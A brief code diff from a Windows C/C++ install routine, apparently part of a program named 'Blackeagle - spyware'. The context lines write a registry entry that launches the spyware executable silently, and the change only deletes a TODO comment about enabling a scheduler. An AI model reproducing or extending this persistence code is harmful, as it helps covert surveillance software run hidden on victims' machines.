@@ -35,8 +35,6 @@ LPVOID install(BOOL reg) {
 	regValue = L"\"C:\\Program Files(x86)\\blackeagle\\Blackeagle - spyware.exe\" -silent";
 	createKey(regPath, (LPWSTR)regName, (LPWSTR)regValue);
 
-	// TODO 
-	// Enable scheduler
 	return NULL;
 }
 
